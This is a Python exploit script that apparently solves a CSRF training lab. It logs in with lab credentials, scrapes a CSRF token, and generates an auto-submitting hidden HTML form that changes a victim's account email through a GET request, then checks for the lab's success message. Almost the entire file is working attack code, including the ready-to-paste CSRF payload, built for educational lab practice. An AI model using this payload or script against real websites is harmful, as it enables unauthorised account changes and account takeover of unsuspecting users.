import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def exploit_csrf(s, url):
    login_path = '/login'
    account_path = '/my-account?id=wiener'
    csrf = get_csrf(s, url)
    data = {'username':'wiener','password':'peter','csrf':csrf}
    r = s.post(url+login_path, data=data, verify=False, proxies=proxies)
    poc = change_email(s, url)
    print("(+) Copy below code and paste in body section of exploit server")
    print(poc)
    print("(+) Click on store followed by deliver exploit to victim")
    time.sleep(15)
    r1 = s.get(url+account_path, verify=False, proxies=proxies)
    if "Congratulations" in r1.text:
        print("(+) CSRF Exploit successful!")
    else:
        print("(-) Error Exploiting CSRF")

def change_email(s, url):
    email_path = '/my-account/change-email'
    data = {'email':'test8@test.com'}
    query_parameters = "&".join([f"{key}={value}" for key, value in data.items()])
    url_with_params = f"?{query_parameters}"
    response = s.get(url+email_path+url_with_params, verify=False, proxies=proxies)
    poc = f'''<html>
  <body>
    <form action="{url+email_path}">
      <input type="hidden" name="email" value="test5&#64;te&#46;co" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
'''
    return poc
def get_csrf(s, url):
    path = '/login'
    r = s.get(url+path, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find('input')['value']
    return csrf
if __name__=='__main__':
    try:
        url = sys.argv[1]
    except IndexError:
        print("Usage: python %s <url>" %sys.argv[0])
        print("Example: python %s example.com" %sys.argv[0])
        sys.exit(1)
    s = requests.session()
    exploit_csrf(s, url)